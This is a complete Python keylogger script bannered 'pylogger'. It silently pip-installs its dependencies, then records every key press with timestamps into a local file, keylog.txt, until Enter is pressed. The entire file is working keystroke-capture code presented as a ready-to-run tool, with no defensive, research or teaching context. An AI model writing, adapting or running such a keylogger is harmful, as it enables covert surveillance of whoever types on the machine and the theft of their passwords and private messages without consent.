import sys
import subprocess
import logging
from pynput import keyboard
from colorama import init, Fore, Style

# Initialize Colorama
init()

# List of required packages
required_packages = ['pynput', 'colorama']

# Check if a package is installed
def check_package_installed(package_name):
    try:
        subprocess.check_output([sys.executable, '-m', 'pip', 'show', package_name])
        return True
    except subprocess.CalledProcessError:
        return False

# Install missing packages
def install_packages(package_list):
    for package in package_list:
        if not check_package_installed(package):
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

# Install required packages
install_packages(required_packages)

# Configure the logger
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s %(message)s')

# Callback function to handle key press events
def on_press(key):
    # Log the key
    logging.info(str(key))

# Create a listener
listener = keyboard.Listener(on_press=on_press)

# Start the listener
listener.start()

# Define the banner
banner = f'''{Fore.GREEN}
         _                     
 ___ _ _| |___ ___ ___ ___ ___ 
| . | | | | . | . | . | -_|  _|
|  _|_  |_|___|_  |_  |___|_|  
|_| |___|     |___|___|        
{Style.RESET_ALL}                               
Press Enter to stop...
'''

# Print the colored banner
print(banner)

# Wait for Enter key press to stop the script
input()

# Stop the listener
listener.stop()

# Wait for the listener to join (if necessary)
listener.join()
